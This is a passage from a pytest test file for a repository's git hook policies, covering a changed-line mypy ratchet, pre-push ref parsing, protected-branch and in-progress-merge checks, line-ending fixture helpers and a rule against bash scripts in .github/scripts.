    assert "cannot execute semgrep" in result.stderr


def test_semgrep_empty_target_set_is_clean(tmp_path: Path) -> None:
    assert policy._run_semgrep_tree(tmp_path, [], tmp_path).returncode == 0


def test_mypy_partition_separates_collisions_and_validation_modules() -> None:
    invocations = policy._mypy_invocations(
        [
            "pkg_a/foo.py",
            "pkg_b/foo.py",
            "pkg_c/bar.py",
            "scripts/validation/checks_spec.py",
            "scripts/validation/checks_common.py",
        ]
    )

    assert (["pkg_c/bar.py"], False) in invocations
    assert (["pkg_a/foo.py"], False) in invocations
    assert (["pkg_b/foo.py"], False) in invocations
    assert (["scripts/validation/checks_spec.py"], True) in invocations
    assert (["scripts/validation/checks_common.py"], True) in invocations
    assert not any(
        "pkg_a/foo.py" in paths and "pkg_b/foo.py" in paths
        for paths, _needs_validation_path in invocations
    )


def test_mypy_policy_aggregates_failures_and_ignores_deleted_files(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    source = tmp_path / "source.py"
    _write_lf(source, "value: int = 1\n")
    monkeypatch.setattr(policy, "_invoke_mypy", lambda *_args: _completed(1))

    assert policy.run_mypy(["deleted.py"], tmp_path) == 0
    assert policy.run_mypy(["source.py", "deleted.py"], tmp_path) == 1


def test_mypy_policy_rejects_unsafe_paths_and_symlinks(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    assert policy.run_mypy(["../outside.py"], tmp_path) == 2

    source = tmp_path / "source.py"
    _write_lf(source, "value: int = 1\n")
    original_is_symlink = Path.is_symlink
    monkeypatch.setattr(
        Path,
        "is_symlink",
        lambda path: path == source or original_is_symlink(path),
    )
    assert policy.run_mypy(["source.py"], tmp_path) == 2


def _write_source(tmp_path: Path, name: str = "source.py") -> None:
    _write_lf(tmp_path / name, "value: int = 1\n")


def test_parse_changed_lines_maps_hunks_to_files() -> None:
    diff = (
        "diff --git a/pkg/a.py b/pkg/a.py\n"
        "--- a/pkg/a.py\n"
        "+++ b/pkg/a.py\n"
        "@@ -2 +2 @@\n"
        "+changed line two\n"
        "@@ -10,0 +11,2 @@\n"
        "+added eleven\n"
        "+added twelve\n"
        "diff --git a/pkg/b.py b/pkg/b.py\n"
        "--- a/pkg/b.py\n"
        "+++ b/pkg/b.py\n"
        "@@ -5,1 +5,0 @@\n"
        "-deleted only, no additions\n"
    )

    changed = policy._parse_changed_lines(diff)

    assert changed["pkg/a.py"] == {2, 11, 12}
    # Pure deletion hunk (+5,0) contributes no changed lines: adding the
    # neighbor line would flag unchanged code (the issue #2993 regression).
    assert changed["pkg/b.py"] == set()


def test_parse_changed_lines_ignores_pure_rename() -> None:
    # A content-free rename carries no ``+++ b/`` hunk, so the renamed path
    # never enters the map and its unchanged lines cannot block the ratchet.
    diff = (
        "diff --git a/pkg/old.py b/pkg/new.py\n"
        "similarity index 100%\n"
        "rename from pkg/old.py\n"
        "rename to pkg/new.py\n"
    )

    changed = policy._parse_changed_lines(diff)

    assert changed == {}


def test_parse_mypy_error_locations_selects_errors_only() -> None:
    stdout = (
        "pkg/a.py:12: error: Incompatible types  [assignment]\n"
        "pkg/a.py:12:5: error: With a column here  [misc]\n"
        "pkg/a.py:20: note: advisory only\n"
        "pyproject.toml: note: unused section(s): module = ['x']\n"
        "Found 2 errors in 1 file (checked 1 source file)\n"
    )

    locations = policy._parse_mypy_error_locations(stdout)

    assert locations == [("pkg/a.py", 12), ("pkg/a.py", 12)]


def test_parse_mypy_error_locations_normalizes_windows_paths() -> None:
    stdout = (
        "C:/proj/pkg/a.py:12: error: drive-letter absolute  [assignment]\n"
        "pkg\\a.py:20: error: relative backslash  [misc]\n"
        "pkg\\a.py:20:5: error: backslash with column  [misc]\n"
    )

    locations = policy._parse_mypy_error_locations(stdout)

    assert locations == [
        ("C:/proj/pkg/a.py", 12),
        ("pkg/a.py", 20),
        ("pkg/a.py", 20),
    ]


def test_normalize_ratchet_path_converts_backslashes_and_strips_dot_slash() -> None:
    assert policy._normalize_ratchet_path("pkg\\mod.py") == "pkg/mod.py"
    assert policy._normalize_ratchet_path(".\\pkg\\mod.py") == "pkg/mod.py"
    assert policy._normalize_ratchet_path("  pkg/mod.py  ") == "pkg/mod.py"


def test_mypy_ratchet_blocks_backslash_path_on_changed_line(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # mypy on Windows can report a backslash-separated path; the ratchet must
    # still match it against the forward-slash pushed set and changed-line map.
    (tmp_path / "pkg").mkdir()
    _write_lf(tmp_path / "pkg" / "mod.py", "value: int = 1\n")
    monkeypatch.setattr(policy, "_changed_line_map", lambda *_a: {"pkg/mod.py": {2}})
    monkeypatch.setattr(
        policy,
        "_invoke_mypy",
        lambda *_a: _completed(1, "pkg\\mod.py:2: error: bad  [assignment]\n"),
    )

    assert policy.run_mypy(["pkg/mod.py"], tmp_path) == 1


def test_mypy_ratchet_base_ref_prefers_env_over_default(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv(policy.MYPY_RATCHET_BASE_REF_ENV, "origin/release")
    assert policy._mypy_ratchet_base_ref() == "origin/release"

    monkeypatch.setenv(policy.MYPY_RATCHET_BASE_REF_ENV, "0" * 40)
    assert policy._mypy_ratchet_base_ref() == policy.MYPY_RATCHET_DEFAULT_BASE

    monkeypatch.delenv(policy.MYPY_RATCHET_BASE_REF_ENV, raising=False)
    assert policy._mypy_ratchet_base_ref() == policy.MYPY_RATCHET_DEFAULT_BASE


def test_changed_line_map_reads_real_git_diff(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo, branch="main")
    base = _commit_file(repo, "mod.py", "line one\nline two\nline three\n")
    _write_lf(repo / "mod.py", "line one\nline TWO changed\nline three\nline four\nline five\n")
    _write_file(repo, "mod.py", "line one\nline TWO changed\nline three\nline four\nline five\n")
    _git(repo, "add", "--", "mod.py")
    _git(repo, "commit", "-qm", "test: modify mod.py")

    changed = policy._changed_line_map(["mod.py"], repo, base)

    assert changed is not None
    assert 2 in changed["mod.py"]
    assert 4 in changed["mod.py"]
    assert 5 in changed["mod.py"]
    assert 1 not in changed["mod.py"]
    assert 3 not in changed["mod.py"]


def test_changed_line_map_returns_none_when_base_unresolved(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo, branch="main")
    _commit_file(repo, "mod.py", "line one\n")

    # origin/main does not exist in this fresh repo, so the diff fails.
    assert policy._changed_line_map(["mod.py"], repo, "origin/main") is None


def test_mypy_ratchet_blocks_error_on_changed_line(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _write_source(tmp_path)
    monkeypatch.setattr(policy, "_changed_line_map", lambda *_a: {"source.py": {2}})
    monkeypatch.setattr(
        policy,
        "_invoke_mypy",
        lambda *_a: _completed(1, "source.py:2: error: bad  [assignment]\n"),
    )

    assert policy.run_mypy(["source.py"], tmp_path) == 1


def test_mypy_ratchet_passes_preexisting_error_on_unchanged_line(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _write_source(tmp_path)
    monkeypatch.setattr(policy, "_changed_line_map", lambda *_a: {"source.py": {5}})
    monkeypatch.setattr(
        policy,
        "_invoke_mypy",
        lambda *_a: _completed(1, "source.py:2: error: preexisting  [assignment]\n"),
    )

    assert policy.run_mypy(["source.py"], tmp_path) == 0


def test_mypy_ratchet_new_file_blocks_all_errors(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _write_source(tmp_path, "new.py")
    monkeypatch.setattr(policy, "_changed_line_map", lambda *_a: {"new.py": {1, 2, 3}})
    monkeypatch.setattr(
        policy,
        "_invoke_mypy",
        lambda *_a: _completed(1, "new.py:2: error: bad  [assignment]\n"),
    )

    assert policy.run_mypy(["new.py"], tmp_path) == 1


def test_mypy_ratchet_fatal_without_error_line_blocks(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _write_source(tmp_path)
    monkeypatch.setattr(policy, "_changed_line_map", lambda *_a: {"source.py": {5}})
    monkeypatch.setattr(
        policy,
        "_invoke_mypy",
        lambda *_a: _completed(2, "mod is not a valid Python package name\n"),
    )

    assert policy.run_mypy(["source.py"], tmp_path) == 1


def test_mypy_ratchet_falls_back_to_block_all_when_base_unresolved(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _write_source(tmp_path)
    monkeypatch.setattr(policy, "_changed_line_map", lambda *_a: None)
    monkeypatch.setattr(
        policy,
        "_invoke_mypy",
        lambda *_a: _completed(1, "source.py:99: error: anything  [assignment]\n"),
    )

    assert policy.run_mypy(["source.py"], tmp_path) == 1


def test_mypy_ratchet_ignores_error_in_unpushed_file(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _write_source(tmp_path)
    monkeypatch.setattr(policy, "_changed_line_map", lambda *_a: {"source.py": {2}})
    monkeypatch.setattr(
        policy,
        "_invoke_mypy",
        lambda *_a: _completed(1, "imported.py:2: error: not pushed  [assignment]\n"),
    )

    assert policy.run_mypy(["source.py"], tmp_path) == 0


def test_mypy_invocation_sets_validation_path(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    captured: list[Mapping[str, str] | None] = []

    def fake_run(
        _args: Sequence[str],
        _root: Path,
        **kwargs: object,
    ) -> subprocess.CompletedProcess[str]:
        extra_env = kwargs.get("extra_env")
        assert extra_env is None or isinstance(extra_env, Mapping)
        captured.append(extra_env)
        return _completed(0)

    monkeypatch.setattr(policy, "_run_command", fake_run)
    monkeypatch.setenv("MYPYPATH", "inherited")

    policy._invoke_mypy(["source.py"], tmp_path, False)
    policy._invoke_mypy(["scripts/validation/checks_spec.py"], tmp_path, True)

    assert captured[0] is None
    assert captured[1] == {"MYPYPATH": f"{tmp_path / 'scripts/validation'}{os.pathsep}inherited"}


def test_push_ref_parser_preserves_multiple_refs_and_deletions() -> None:
    zero = "0" * 40
    one = "1" * 40
    two = "2" * 40
    stream = io.StringIO(
        f"refs/heads/one {one} refs/heads/one {zero}\n(delete) {zero} refs/heads/two {two}\n"
    )

    refs = policy.parse_push_refs(stream)

    assert len(refs) == 2
    assert refs[0].is_new
    assert refs[1].is_deletion


def test_push_ref_parser_rejects_malformed_input() -> None:
    with pytest.raises(ValueError, match="four pre-push fields"):
        policy.parse_push_refs(io.StringIO("too few fields\n"))
    with pytest.raises(ValueError, match="invalid object id"):
        policy.parse_push_refs(io.StringIO("refs/heads/a nope refs/heads/a nope\n"))


def test_push_files_warning_emits_for_off_head_ref(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    head = "1" * 40
    off_head = "2" * 40
    refs = [
        policy.PushRef("refs/heads/current", head, "refs/heads/current", "0" * 40),
        policy.PushRef("refs/heads/other", off_head, "refs/heads/other", "0" * 40),
    ]
    monkeypatch.setattr(
        policy,
        "_run_git",
        lambda *_args, **_kwargs: _completed(0, f"{head}\n"),
    )

    policy.warn_if_push_files_incomplete(refs, tmp_path)

    warning = capsys.readouterr().err
    assert "Lefthook {push_files} quality coverage may be incomplete" in warning
    assert "Push each ref from its checked-out branch" in warning


def test_push_files_warning_is_quiet_for_checked_out_head(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    head = "1" * 40
    push_base = "2" * 40
    refs = [
        policy.PushRef(
            "refs/heads/current",
            head,
            "refs/heads/current",
            push_base,
        ),
    ]

    def run_git(_repo_root: Path, args: list[str]) -> subprocess.CompletedProcess[str]:
        if args == ["rev-parse", "HEAD"]:
            return _completed(0, f"{head}\n")
        if args == ["rev-parse", "--verify", "@{push}"]:
            return _completed(0, f"{push_base}\n")
        raise AssertionError(args)

    monkeypatch.setattr(policy, "_run_git", run_git)

    policy.warn_if_push_files_incomplete(refs, tmp_path)

    assert capsys.readouterr().err == ""


def test_push_files_warning_emits_for_new_branch(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    head = "1" * 40
    refs = [
        policy.PushRef("refs/heads/new", head, "refs/heads/new", "0" * 40),
    ]

    def run_git(_repo_root: Path, args: list[str]) -> subprocess.CompletedProcess[str]:
        if args == ["rev-parse", "HEAD"]:
            return _completed(0, f"{head}\n")
        if args == ["rev-parse", "--verify", "@{push}"]:
            return _completed(128, "", "no push ref\n")
        raise AssertionError(args)

    monkeypatch.setattr(policy, "_run_git", run_git)

    policy.warn_if_push_files_incomplete(refs, tmp_path)

    assert "quality coverage may be incomplete" in capsys.readouterr().err


def test_push_policy_allows_deletion_only_input(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    zero = "0" * 40
    old = "1" * 40

    result = policy.check_push_refs(
        io.StringIO(f"(delete) {zero} refs/heads/old {old}\n"),
        repo,
    )

    assert result == 0


def test_push_policy_rejects_protected_branch_deletion(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    zero = "0" * 40
    old = "1" * 40

    result = policy.check_push_refs(
        io.StringIO(f"(delete) {zero} refs/heads/main {old}\n"),
        repo,
    )

    assert result == 1


def test_push_policy_blocks_unresolved_merge_before_history_checks(
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "tracked.txt", "base\n")
    _git(repo, "checkout", "-q", "-b", "other")
    _commit_file(repo, "tracked.txt", "other\n")
    _git(repo, "checkout", "-q", "feature/test")
    _commit_file(repo, "tracked.txt", "feature\n")
    _git(repo, "merge", "other", check=False)
    monkeypatch.setattr(
        policy,
        "_check_history_integrity",
        lambda _repo_root: pytest.fail("history checks should not run during a merge"),
    )

    result = policy.check_push_refs(io.StringIO(), repo)

    assert result == 1
    error = capsys.readouterr().err
    assert "merge in progress" in error
    assert "tracked.txt" in error
    assert "git merge --abort" in error


def test_push_policy_blocks_resolved_uncommitted_merge(
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "tracked.txt", "base\n")
    _git(repo, "checkout", "-q", "-b", "other")
    _commit_file(repo, "tracked.txt", "other\n")
    _git(repo, "checkout", "-q", "feature/test")
    _commit_file(repo, "tracked.txt", "feature\n")
    _git(repo, "merge", "other", check=False)
    _write_file(repo, "tracked.txt", "resolved\n")
    _git(repo, "add", "tracked.txt")

    result = policy.check_push_refs(io.StringIO(), repo)

    assert result == 1
    error = capsys.readouterr().err
    assert "merge in progress" in error
    assert "No unmerged paths remain" in error
    assert "git commit" in error


@pytest.mark.parametrize(
    ("head_file", "operation", "remedy"),
    [
        ("REBASE_HEAD", "rebase", "git rebase --continue"),
        ("CHERRY_PICK_HEAD", "cherry-pick", "git cherry-pick --continue"),
    ],
)
def test_push_policy_names_active_git_operation(
    head_file: str,
    operation: str,
    remedy: str,
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    head = _commit_file(repo, "tracked.txt", "base\n")
    git_path = Path(_git(repo, "rev-parse", "--git-path", head_file).stdout.strip())
    if not git_path.is_absolute():
        git_path = repo / git_path
    git_path.write_text(f"{head}\n", encoding="utf-8")

    result = policy.check_push_refs(io.StringIO(), repo)

    assert result == 1
    error = capsys.readouterr().err
    assert f"{operation} in progress" in error
    assert remedy in error


def test_push_policy_allows_clean_tree_without_active_git_operation(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "tracked.txt", "base\n")

    assert policy.check_push_refs(io.StringIO(), repo) == 0


def test_fetch_origin_main_refreshes_stale_tracking_ref(tmp_path: Path) -> None:
    remote = tmp_path / "remote.git"
    writer = tmp_path / "writer"
    repo = tmp_path / "repo"
    subprocess.run(["git", "init", "--bare", "-q", str(remote)], check=True)
    _init_repo(writer, branch="main")
    first = _commit_file(writer, "tracked", "first\n")
    _git(writer, "remote", "add", "origin", str(remote))
    _git(writer, "push", "-q", "origin", "main")
    subprocess.run(
        ["git", "--git-dir", str(remote), "symbolic-ref", "HEAD", "refs/heads/main"],
        check=True,
    )
    subprocess.run(["git", "clone", "-q", str(remote), str(repo)], check=True)
    _git(repo, "config", "user.name", "Test User")
    _git(repo, "config", "user.email", "user@example.com")
    _git(writer, "checkout", "main")
    second = _commit_file(writer, "tracked", "second\n")
    _git(writer, "push", "-q", "origin", "main")
    assert _git(repo, "rev-parse", "origin/main").stdout.strip() == first

    policy._fetch_origin_main(repo)

    assert _git(repo, "rev-parse", "origin/main").stdout.strip() == second


def test_fetch_origin_main_failure_warns_and_continues(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(1))

    policy._fetch_origin_main(tmp_path)

    assert "using local ref" in capsys.readouterr().err


def test_push_policy_blocks_main_and_preserves_destination_branch(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    head = "1" * 40
    remote = "2" * 40
    destinations: list[str | None] = []

    def capture_limit(update: policy.PushUpdate, _root: Path) -> int:
        destinations.append(update.destination_branch)
        return 0

    monkeypatch.setattr(policy, "_check_commit_limit", capture_limit)
    monkeypatch.setattr(policy, "_check_review_marker", lambda *_args: 0)
    monkeypatch.setattr(policy, "_check_plugin_version", lambda *_args: 0)

    blocked = policy.check_push_refs(
        io.StringIO(f"refs/heads/local {head} refs/heads/main {remote}\n"),
        repo,
    )
    allowed = policy.check_push_refs(
        io.StringIO(f"refs/heads/local {head} refs/heads/destination {remote}\n"),
        repo,
    )

    assert blocked == 1
    assert allowed == 0
    assert destinations == ["destination"]


def test_new_branch_uses_origin_main_for_policy_bases(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    base = _commit_file(repo, "tracked", "base\n")
    _git(repo, "update-ref", "refs/remotes/origin/main", base)
    head = _commit_file(repo, "tracked", "head\n")
    push_ref = policy.PushRef(
        "refs/heads/feature/test",
        head,
        "refs/heads/feature/test",
        "0" * 40,
    )

    update = policy.resolve_push_update(push_ref, repo)

    assert update.base == base
    assert update.head == head
    assert update.range_spec == f"{base}..{head}"


def test_commit_limit_queries_the_destination_branch(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    update = policy.PushUpdate(
        source=policy.PushRef("refs/heads/local", "1" * 40, "refs/heads/other", "2" * 40),
        base="origin/main",
        head="1" * 40,
        range_spec="origin/main..head",
        destination_branch="other",
    )
    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(0, "21\n"))
    captured: list[str] = []

    def fake_command(
        args: Sequence[str],
        _root: Path,
        **_kwargs: object,
    ) -> subprocess.CompletedProcess[str]:
        captured.extend(args)
        return _completed(0, "bypass present\n")

    monkeypatch.setattr(policy, "_run_command", fake_command)

    assert policy._check_commit_limit(update, tmp_path) == 0
    assert captured[-2:] == ["--branch", "other"]


def test_plugin_version_policy_passes_exact_base_and_head(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    update = policy.PushUpdate(
        source=policy.PushRef("refs/heads/a", "1" * 40, "refs/heads/b", "2" * 40),
        base="base-sha",
        head="head-sha",
        range_spec="base-sha..head-sha",
        destination_branch="b",
    )
    captured: list[str] = []

    def fake_command(
        args: Sequence[str],
        _root: Path,
        **_kwargs: object,
    ) -> subprocess.CompletedProcess[str]:
        captured.extend(args)
        return _completed(0)

    monkeypatch.setattr(policy, "_run_command", fake_command)

    assert policy._check_plugin_version(update, tmp_path) == 0
    assert captured[captured.index("--base") + 1] == "base-sha"
    assert captured[captured.index("--head") + 1] == "head-sha"


def test_review_marker_policy_is_optional_but_invalid_marker_blocks(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    update = _push_update()
    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(0, ""))
    assert policy._check_review_marker(update, tmp_path) == 0

    monkeypatch.setattr(
        policy,
        "_run_git",
        lambda *_args: _completed(0, "/review@security on deadbeef\n"),
    )
    monkeypatch.setattr(policy, "_run_command", lambda *_args, **_kwargs: _completed(1))
    assert policy._check_review_marker(update, tmp_path) == 1


def test_blob_readers_report_missing_objects(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(policy, "_run_git_bytes", lambda *_args: _completed(1))

    assert policy._read_index_blob(tmp_path, "missing") is None
    assert policy._read_head_blob(tmp_path, "missing") is None


def test_head_blob_reader_returns_content(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    tracked = repo / "tracked"
    raw = b"content\r\n"
    tracked.write_bytes(raw)
    _git(repo, "add", "tracked")
    _git(repo, "commit", "-qm", "test: add tracked")

    assert policy._read_head_blob(repo, "tracked") == raw


def test_committed_crlf_survives_the_trip_through_the_test_helper(tmp_path: Path) -> None:
    """`_commit_file` has to store the bytes it was handed, on every platform.

    The helper used `Path.write_text`, whose default newline handling
    translates `\\n` to `os.linesep`. On Windows this content reached git as
    `a\\r\\r\\nb\\r\\n`, so the reader below correctly returned bytes the
    caller never asked for and the fixture looked like a broken reader. A
    text-mode reader hid it by folding the endings back on the way out.

    `os.linesep` is `\\n` here, so this test cannot fail on Linux. It pins the
    contract that the helper stores the bytes it was handed, and Windows CI is
    what exercises it.
    """
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "tracked", "a\r\nb\n")

    assert policy._read_head_blob(repo, "tracked") == b"a\r\nb\n"


def test_a_committed_lone_carriage_return_is_not_expanded(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "tracked", "a\rb")

    assert policy._read_head_blob(repo, "tracked") == b"a\rb"


def test_a_worktree_write_stores_the_bytes_it_was_handed(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)

    _write_file(repo, "tracked", "one\ntwo\n")

    assert (repo / "tracked").read_bytes() == b"one\ntwo\n"


def test_a_worktree_write_leaves_carriage_returns_alone(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)

    _write_file(repo, "tracked", "one\r\ntwo\r")

    assert (repo / "tracked").read_bytes() == b"one\r\ntwo\r"


def test_a_worktree_write_creates_the_parent_directory(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)

    _write_file(repo, "nested/deeper/tracked", "content\n")

    assert (repo / "nested/deeper/tracked").read_bytes() == b"content\n"


def test_seeding_and_revising_a_file_differ_only_where_the_text_differs(
    tmp_path: Path,
) -> None:
    """Pin the two fixture writers against each other.

    `_commit_file` seeds a path and `_write_file` revises it, so a diff across
    the pair has to show the edited line and nothing else. When the two used
    different newline handling this diff was every line under Windows, which is
    how `test_changed_line_map_reads_real_git_diff` failed there while passing
    everywhere else. `os.linesep` is `\n` on Linux, so this cannot go red here;
    Windows CI is what exercises it.
    """
    repo = tmp_path / "repo"
    _init_repo(repo, branch="main")
    base = _commit_file(repo, "mod.py", "one\ntwo\nthree\n")
    _write_file(repo, "mod.py", "one\nTWO\nthree\n")
    _git(repo, "add", "--", "mod.py")
    _git(repo, "commit", "-qm", "test: revise mod.py")

    changed = policy._changed_line_map(["mod.py"], repo, base)

    assert changed is not None
    assert changed["mod.py"] == {2}


def _repo_relative_path(node: ast.expr) -> str | None:
    """Return `repo:a/b` for `repo / "a" / "b"`, else None."""
    parts: list[str] = []
    while isinstance(node, ast.BinOp) and isinstance(node.op, ast.Div):
        if not isinstance(node.right, ast.Constant) or not isinstance(node.right.value, str):
            return None
        parts.append(node.right.value)
        node = node.left
    if not (isinstance(node, ast.Name) and parts):
        return None
    return node.id + ":" + "/".join(reversed(parts))


def _functions_writing_one_path_two_ways(source: str) -> dict[str, list[str]]:
    """Name every function that writes one repo path with both primitives.

    Resolves single-assignment local aliases. A scan that only matched literal
    paths reported this module clean while three functions still mixed, because
    each bound the path to a local first. That blind spot is why this is a test
    rather than a claim in a description.
    """
    found: dict[str, list[str]] = {}
    for fn in ast.walk(ast.parse(source)):
        if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
            continue
        alias: dict[str, str] = {}
        committed: set[str] = set()
        texted: set[str] = set()
        for node in ast.walk(fn):
            if (
                isinstance(node, ast.Assign)
                and len(node.targets) == 1
                and isinstance(node.targets[0], ast.Name)
            ):
                key = _repo_relative_path(node.value)
                if key is not None:
                    alias[node.targets[0].id] = key
            if not isinstance(node, ast.Call):
                continue
            if (
                isinstance(node.func, ast.Name)
                and node.func.id in {"_commit_file", "_write_file"}
                and len(node.args) >= 2
                and isinstance(node.args[0], ast.Name)
                and isinstance(node.args[1], ast.Constant)
                and isinstance(node.args[1].value, str)
            ):
                committed.add(f"{node.args[0].id}:{node.args[1].value}")
            if isinstance(node.func, ast.Attribute) and node.func.attr == "write_text":
                key = _repo_relative_path(node.func.value)
                if key is None and isinstance(node.func.value, ast.Name):
                    key = alias.get(node.func.value.id)
                if key is not None:
                    texted.add(key)
        shared = sorted(committed & texted)
        if shared:
            found[fn.name] = shared
    return found


def test_no_function_writes_one_repo_path_with_both_primitives() -> None:
    """The fixture writers must not disagree about newlines within one path.

    `_commit_file` and `_write_file` write bytes; `Path.write_text` translates
    `\n` to `os.linesep`. A function that seeds a path one way and revises it
    the other produced two revisions differing on every line under Windows, so
    any diff taken across them measured the line endings rather than the edit.
    """
    source = Path(__file__).read_text(encoding="utf-8")

    assert _functions_writing_one_path_two_ways(source) == {}


def test_the_mixed_writer_scan_sees_a_write_named_inline() -> None:
    source = (
        "def t(repo):\n"
        "    _commit_file(repo, 'a.py', 'x\\n')\n"
        "    (repo / 'a.py').write_text('y\\n')\n"
    )

    assert _functions_writing_one_path_two_ways(source) == {"t": ["repo:a.py"]}


def test_the_mixed_writer_scan_sees_a_write_through_a_local_alias() -> None:
    """The shape a literal-only scan missed, which let three of these through."""
    source = (
        "def t(repo):\n"
        "    _commit_file(repo, 'nested/a.py', 'x\\n')\n"
        "    source = repo / 'nested' / 'a.py'\n"
        "    source.write_text('y\\n')\n"
    )

    assert _functions_writing_one_path_two_ways(source) == {"t": ["repo:nested/a.py"]}


def test_the_mixed_writer_scan_leaves_two_different_paths_alone() -> None:
    """Only one path written both ways is a defect; two paths are not."""
    source = (
        "def t(repo):\n"
        "    _commit_file(repo, 'a.py', 'x\\n')\n"
        "    other = repo / 'b.py'\n"
        "    other.write_text('y\\n')\n"
    )

    assert _functions_writing_one_path_two_ways(source) == {}


def test_the_head_blob_reader_returns_none_for_a_path_no_commit_holds(
    tmp_path: Path,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "tracked", "content\n")

    assert policy._read_head_blob(repo, "absent") is None


def test_branch_policy_reports_git_configuration_error(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(2))

    assert policy.check_branch(tmp_path) == 2


def test_merge_detection_uses_git_path(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    head = _commit_file(repo, "tracked", "content\n")
    merge_head = repo / _git(repo, "rev-parse", "--git-path", "MERGE_HEAD").stdout.strip()
    _write_lf(merge_head, f"{head}\n")

    assert policy._merge_in_progress(repo)


def test_missing_index_blobs_are_ignored_by_content_policies(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)

    assert policy.check_staged_dashes(["missing.md"], repo) == 0
    assert policy.check_staged_action_pins(["missing.yml"], repo) == 0


def test_local_action_without_list_marker_takes_local_action_branch(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    workflow = repo / "action.yml"
    _write_lf(workflow, "uses: ./local-action\n")
    _git(repo, "add", "action.yml")

    assert policy.check_staged_action_pins(["action.yml"], repo) == 0


def test_github_bash_policy_blocks_extensions_and_shebangs(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    scripts = repo / ".github/scripts"
    scripts.mkdir(parents=True)
    shell_script = scripts / "blocked.sh"
    disguised_script = scripts / "blocked"
    python_script = scripts / "allowed.py"
    _write_lf(shell_script, "echo blocked\n")
    _write_lf(disguised_script, "#!/usr/bin/env bash\necho blocked\n")
    _write_lf(python_script, "#!/usr/bin/env python3\n")
    _git(repo, "add", ".github/scripts")

    assert (
        policy.check_github_bash_scripts(
            [
                ".github/scripts/blocked.sh",
                ".github/scripts/blocked",
                ".github/scripts/allowed.py",
            ],
            repo,
        )
        == 1
    )
    assert policy.check_github_bash_scripts([".github/scripts/allowed.py"], repo) == 0


def test_github_bash_policy_handles_non_candidates_and_missing_blobs(
    tmp_path: Path,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)

    assert policy.check_github_bash_scripts(["../escape.sh"], repo) == 2
    assert policy.check_github_bash_scripts(["scripts/allowed.sh"], repo) == 0
    assert policy.check_github_bash_scripts([".github/scripts/deleted.sh"], repo) == 0


def test_generated_agent_candidates_expand_allowlisted_globs(tmp_path: Path) -> None:
    generated = tmp_path / "src/copilot-cli/agents/test.agent.md"
    generated.parent.mkdir(parents=True)
    _write_lf(generated, "agent\n")

    assert generated in policy._generated_candidates("agents", tmp_path)


def test_generated_staging_handles_absent_outside_and_git_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    _commit_file(repo, "tracked.txt", "tracked\n")
    assert policy.stage_generated("mcp", repo) == 0

    outside = tmp_path / "outside-file"
